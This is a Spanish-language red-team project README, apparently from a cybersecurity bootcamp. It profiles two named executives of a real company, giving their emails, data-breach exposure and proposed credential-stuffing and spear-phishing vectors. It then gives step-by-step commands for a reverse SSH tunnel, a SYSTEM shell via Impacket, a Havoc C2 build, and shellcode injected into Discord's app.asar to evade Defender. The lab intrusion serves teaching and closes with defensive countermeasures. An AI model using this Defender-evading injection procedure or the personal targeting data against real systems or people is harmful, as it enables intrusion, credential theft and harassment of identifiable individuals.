# 🏴‍☠️ OPERACIÓN SHADOW SURGE — Red Team Full Lifecycle

<div align="center">
  <img src="https://img.shields.io/badge/STATUS-MISSION%20COMPLETE-success?style=for-the-badge&logo=target" alt="Mission Status" />
  <img src="https://img.shields.io/badge/C2-HAVOC%20v0.7-black?style=for-the-badge&logo=kalilinux" alt="C2" />
  <img src="https://img.shields.io/badge/TARGET-WINDOWS%2010-blue?style=for-the-badge&logo=windows" alt="Target OS" />
  <img src="https://img.shields.io/badge/EVASION-DEFENDER%20BYPASS-red?style=for-the-badge&logo=microsoft" alt="Defense Evasion" />
</div>

<br />

> **"No se trata de romper la cerradura, sino de convencer al guardián de que eres parte de la casa."**

**Lead Operator:** `nico` | **Formación:** Full Stack Cybersecurity Bootcamp  
**Objetivo:** Simulación de intrusión avanzada con evasión de EDR nativo  
**Entorno:** Laboratorio híbrido Proxmox — Debian 12 (C2) + Windows 10 (Target)

---

## 📜 RESUMEN DE INTELIGENCIA

Este repositorio documenta una operación Red Team completa, desde el reconocimiento pasivo de un objetivo corporativo real hasta el despliegue de un implante persistente en un host Windows 10 con **Microsoft Defender completamente activo y actualizado**. La operación culmina con una sesión interactiva de Havoc C2 oculta dentro de un proceso firmado por Microsoft, sin generar una sola alerta de seguridad.

| 🔍 Fase | 📄 Informe Original | 🎯 Resultado Clave |
| :---: | :--- | :--- |
| **OSINT** | [📊 Ver informe OSINT](./Osint%20-%20Red%20-%20Team.pdf) | Dos directivos de alto valor perfilados y expuestos en múltiples brechas de datos |
| **C2 & Infección** | [⚙️ Ver Informe Técnico](./Proyecto-%20Red-Team.pdf) | Shellcode inyectada en `Discord.exe` — cero detecciones por Windows Defender |

---

## 🗺️ ARQUITECTURA DEL EJERCICIO

```mermaid
flowchart LR
    subgraph Hipervisor [Proxmox VE - iMac 2012]
        direction TB
        VM1[Debian 12<br/>C2 Server<br/>192.168.0.168]
        VM2[Windows 10<br/>Target<br/>192.168.0.24]
    end

    Operador[Mac M1<br/>Estación de trabajo]
    
    Operador <-->|RDP| VM1
    Operador <-->|RDP| VM2
    VM2 -->|SSH Reverse Tunnel :1337| VM1
    VM2 <==>|Havoc HTTPS :443| VM1

    style VM1 fill:#2d3748,stroke:#68d391,color:#fff
    style VM2 fill:#1a365d,stroke:#63b3ed,color:#fff
    style Operador fill:#4a5568,stroke:#fc8181,color:#fff
⚔️ CYBER KILL CHAIN: FASES DE ATAQUE
text
[1. RECON] ──── [2. WEAPONIZATION] ──── [3. DELIVERY] ──── [4. EXPLOITATION] ──── [5. INSTALLATION] ──── [6. C2] ──── [7. ACTIONS]
   OSINT           Shellcode + ASAR        Sustitución app.asar  Ejecución en Electron   Persistencia en Discord    Havoc     Post-Explotación
🕵️ FASE 1: RECONOCIMIENTO OSINT — OBJETIVO CORPORATIVO
🎯 Target Primario: PcComponentes (Grupo YF Networks)
Toda la inteligencia fue recolectada de forma pasiva, sin enviar un solo paquete SYN a la infraestructura del objetivo.

📊 Ficha de Inteligencia
Campo	Dato
Razón Social	PC Componentes y Multimedia S.L.U.
CIF	B73347494
Dominio Principal	pccomponentes.com
Infraestructura	Cloudflare (AS13335) — CDN, WAF, Anti-DDoS
Registrador	Hosting Concepts B.V. (Registrar.eu)
Dominios del Grupo	pccomponentes.pt, newskillgaming.com, nfortec.com, oversteel.com, drift.es, nox-xtreme.com...
🛠️ Arsenal OSINT Desplegado
Herramienta	Función	Objetivo
whois	Registro de dominios	pccomponentes.com
crt.sh	Logs de Certificate Transparency	%.pccomponentes.com
Shodan / Censys	Escaneo pasivo de puertos/servicios	IPs tras Cloudflare
Have I Been Pwned	Historial de brechas de datos	Emails corporativos
theHarvester	Recolección de emails/subdominios	pccomponentes.com
Google Dorks	Enumeración de archivos y rutas	site:pccomponentes.com -www
LinkedIn / Crunchbase	Perfilado de personal clave	Directivos y equipo IT
👤 TARGET #1 — CEO: Alfonso Tomás
<img src="https://img.shields.io/badge/VALOR-CRÍTICO-red?style=flat-square" alt="Valor Crítico" /> <img src="https://img.shields.io/badge/BRECHAS-2-yellow?style=flat-square" alt="2 Brechas" />

Dato	Valor
Email Corporativo	alfonso.tomas@pccomponentes.com
Cargo	Co-founder & CEO
Formación	Ingeniero Informático (Univ. Murcia)
Ubicación	Alhama de Murcia
Exposición	Entrevistas en Xataka, YouTube, eventos públicos
🩸 Breaches Confirmados (HIBP)
Fecha	Breach	Datos Comprometidos
Nov 2020	Cit0day	Email + Password (texto plano / hash)
Jul 2018	Apollo	Email + Empleador + Cargo + Teléfono + Redes Sociales
📌 Implicación: La contraseña expuesta en Cit0day, si fue reutilizada, abre la puerta a Credential Stuffing directo contra el panel corporativo.

👤 TARGET #2 — COO: Luis Pérez Arteseros
<img src="https://img.shields.io/badge/VALOR-CRÍTICO-red?style=flat-square" alt="Valor Crítico" /> <img src="https://img.shields.io/badge/BRECHAS-6-critical?style=flat-square" alt="6 Brechas" />

Dato	Valor
Email Corporativo	luis.perez@pccomponentes.com
Cargo	COO / General Manager
Trayectoria	Mozo de almacén → COO (conoce toda la operativa interna)
Exposición	LinkedIn público, entrevista en video CECARM
🩸 Breaches Confirmados (HIBP)
Fecha	Breach	Datos Comprometidos
Feb 2024	DemandScience	Email, empleador, cargo, teléfono, dirección física
Nov 2023	LinkedIn Scraped	Email, cargo, nombre, skills, redes sociales
Abr 2021	Phone House España	Fecha de nacimiento, email, teléfono, dirección
Nov 2020	Cit0day	Email + Password
Sep 2020	Nitro PDF	Email + Password (bcrypt) + títulos de documentos
Jul 2018	Apollo	Email, empleador, ubicación, cargo, teléfono
⚠️ CRÍTICO: 6 brechas, dos con contraseñas. Datos completos de identidad (fecha de nacimiento, dirección, teléfono) permiten suplantación de identidad total. Objetivo prioritario para Spear Phishing.

🧬 Vectores de Acceso Identificados
#	Vector	Viabilidad
1	Credential Stuffing contra login corporativo (passwords expuestas)	🔴 Alta
2	Spear Phishing dirigido a CEO/COO usando la inteligencia recolectada	🔴 Alta
3	Supply Chain Attack vía marcas pequeñas del grupo (Newskill, Nfortec...)	🟡 Media
4	Bypass de Cloudflare para descubrir IP de origen real	🟡 Media
5	Explotación de web propia (stack interno según confirmó el COO)	🟡 Media
💻 FASE 2: INFRAESTRUCTURA DE COMANDO Y CONTROL (C2)
🖥️ Preparación del Servidor Debian
bash
# Actualización e instalación de dependencias esenciales
apt update && apt upgrade -y
apt install -y openssh-server golang npm git python3-pip cmake mingw-w64 nasm

# Instalación de Go 1.26.2 (requisito obligatorio para Havoc 0.7)
wget https://go.dev/dl/go1.26.2.linux-amd64.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go1.26.2.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
go version  # Debe mostrar go1.26.2
🔐 Túnel SSH Inverso — El Caballo de Troya
El firewall corporativo bloquea todo el tráfico entrante. Para saltarlo, el objetivo Windows inicia la conexión hacia nosotros.

bash
# COMANDO EJECUTADO DESDE LA MÁQUINA WINDOWS OBJETIVO:
ssh -R 1337 -fCnN \
  -oServerAliveInterval=60 \
  -oServerAliveCountMax=1 \
  -oUserKnownHostsFile=/dev/null \
  -oStrictHostKeyChecking=no \
  root@192.168.0.168
text
┌─────────────────────────────┐      ┌──────────────────────────────┐
│   DEBIAN C2 (Atacante)      │      │   WINDOWS 10 (Víctima)        │
│                             │      │                              │
│   127.0.0.1:1337 ◄──────────┼──────┤   Puerto 445 (SMB)            │
│   Escucha local             │ SSH  │   Expuesto vía túnel inverso  │
│                             │ -R   │                              │
└─────────────────────────────┘      └──────────────────────────────┘
🛡️ Herramientas Ofensivas Desplegadas
Herramienta	Propósito	Instalación
Impacket	Enumeración SMB, ejecución remota	git clone https://github.com/fortra/impacket && pip3 install .
ntlm_challenger	Extracción de info via NTLM sin credenciales	git clone https://github.com/nopfor/ntlm_challenger
Proxychains	Encadenamiento de tráfico por túnel SSH	apt install proxychains4
bash
# Configuración de Proxychains (solo SOCKS5 activo)
cat > /etc/proxychains4.conf << EOF
strict_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1337
EOF
🔍 Enumeración a Través del Túnel
text
$ proxychains python3 ntlm_challenger.py smb://127.0.0.1

[+] S-chain | 127.0.0.1:1337 -> 127.0.0.1:445 -> OK
[+] Hostname: DESKTOP-TV1TOU1
[+] SO: Windows 10 Build 19041
[+] Dominio: WORKGROUP
📸 Verificación: Captura compuesta mostrando el panel de Windows Security en verde (Defender activo, 0 alertas) mientras se ejecutaba la enumeración.

🚀 Movimiento Lateral con Impacket
bash
# Obtención de shell interactiva como SYSTEM
proxychains python3 smbexec.py nico:1234@127.0.0.1

# Resultado:
# whoami
# nt authority\system
🏗️ FASE 3: DESPLIEGUE DE HAVOC C2
🔨 Compilación desde Código Fuente
bash
cd /opt
git clone https://github.com/HavocFramework/Havoc
cd Havoc

# Compilación del Teamserver (Go)
make ts-build

# Compilación del Cliente Gráfico (Qt5/C++)
make client-build
text
[✓] Havoc Framework v0.7
[✓] Teamserver escuchando en wss://0.0.0.0:40056
[✓] Cliente gráfico compilado exitosamente
🎧 Listener HTTPS — Proyecto RED
Parámetro	Valor
Nombre	Proyecto RED
Protocolo	HTTPS
Host	192.168.0.168
Puerto	443
User-Agent	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.3
Sleep / Jitter	2s / 15% (optimizado para interactive shell)
🧬 FASE 4: EVASIÓN DE MICROSOFT DEFENDER — INYECCIÓN EN DISCORD
El núcleo de la operación: un .exe tradicional sería detectado al instante. La shellcode se incrusta en el contenedor ASAR de Discord, un proceso firmado por Microsoft/Slack.

📦 Anatomía de un Contenedor ASAR
text
Discord.exe (Firmado, de confianza)
│
└─ app.asar (Archivo de recursos de Electron)
   ├─ package.json
   ├─ app_bootstrap/
   │  ├─ index.js          ◄──── INYECCIÓN DE CÓDIGO MALICIOSO
   │  └─ keytar.node       ◄──── MÓDULO NATIVO CARGADO COMO EXECUTOR
   └─ ... (resto de la app)
🔪 Procedimiento Quirúrgico
1. Extracción del ASAR

bash
# Copiar app.asar desde Windows a Debian
scp nico@192.168.0.24:"C:/Users/nico/AppData/Local/Discord/app-1.0.9233/resources/app.asar" ~/Escritorio/

# Extraer el contenedor
npm install -g asar
asar extract app.asar unpackedasar/
2. Generación del Shellcode

text
Payload Havoc → Windows Shellcode (.bin)
Formato: Binario puro (sin cabeceras PE)
Sleep: 2s | Jitter: 15% | x64
3. Transformación a Array JavaScript

text
Bytes en HxD: FC 48 89 E6 48 83 E4 F0 ...
Reemplazar " " por ", 0x"
Resultado: [0xFC, 0x48, 0x89, 0xE6, 0x48, 0x83, 0xE4, 0xF0, ...]
4. Inyección en index.js

javascript
// Código inyectado en app_bootstrap/index.js
const exec = require('./keytar.node');
const buf = Buffer.from([
  0xFC, 0x48, 0x89, 0xE6, /* ... SHELLCODE COMPLETA ... */, 0x00
]);
exec.run_array(Array.from(buf));
5. Reempaquetado y Sustitución

bash
# Reempaquetar
asar pack unpackedasar/ app_troyanizado.asar

# En Windows: sustituir el original (con backup)
ren app.asar app.asar.backup
copy app_troyanizado.asar app.asar
✅ VERIFICACIÓN DE INFECCIÓN
Al reiniciar Discord, el Event Viewer de Havoc registra la nueva sesión:

text
[+] Agent Initialized
    ID: 6d9a3f2c
    Hostname: DESKTOP-TV1TOU1
    Usuario: nico
    Proceso: Discord.exe (PID 9328)
    Arquitectura: x64
    Listener: Proyecto RED (HTTPS)
    Estado: HEALTHY
🧪 Post-Explotación Rápida
bash
# Comando ejecutado desde la shell de Havoc
whoami /all

# Información del usuario
Usuario:       DESKTOP-TV1TOU1\nico
Grupos:        BUILTIN\Administrators, BUILTIN\Users
Integridad:    Medium Mandatory Level
Proceso:       Discord.exe (PID 9328)
📊 CADENA DE EJECUCIÓN FINAL
🛡️ CONTRAMEDIDAS RECOMENDADAS (Blue Team)
Nivel	Medida	Efectividad
Red	Monitorizar conexiones salientes de procesos legítimos (Discord → IPs no oficiales)	🔴 Alta
Endpoint	EDR con inspección de asignaciones de memoria ejecutable en procesos firmados	🔴 Alta
Sistema	AppLocker / WDAC restringiendo escritura en carpetas de aplicaciones	🟡 Media
Integridad	Verificación periódica de hashes de archivos ASAR contra versiones oficiales	🟡 Media
Personas	Concienciación sobre aplicaciones de terceros como vectores de ataque	🟢 Fundamental
🏁 CONCLUSIONES
<div align="center">
🎯 Objetivo	✅ Resultado
Laboratorio híbrido montado sobre Proxmox	https://img.shields.io/badge/-OK-success
Havoc C2 v0.7 compilado desde código fuente	https://img.shields.io/badge/-OK-success
Enumeración remota a través de túnel SSH inverso	https://img.shields.io/badge/-OK-success
Movimiento lateral con Impacket + Proxychains	https://img.shields.io/badge/-OK-success
Infección con Windows Defender 100% activo	https://img.shields.io/badge/-OK-success
Sesión persistente en Havoc bajo Discord.exe	https://img.shields.io/badge/-OK-success
CERO ALERTAS DE SEGURIDAD	https://img.shields.io/badge/-0%2520ALERTS-success
</div>
💡 Lección Aprendida:
Los procesos firmados son una espada de doble filo. Al inyectar en Discord, el propio sistema operativo protege al implante. Cualquier aplicación Electron (Slack, VS Code, Teams) es un blanco potencial si el atacante consigue escritura en disco. La defensa contra esto requiere visibilidad sobre el comportamiento en memoria de los procesos, no solo sobre su firma.

<div align="center"> <sub>📅 Abril 2026 | 👤 nico — Full Stack Cybersecurity Bootcamp</sub><br/> <sub>⚠️ Uso exclusivamente académico. No distribuir fuera del ámbito docente.</sub> </div> `
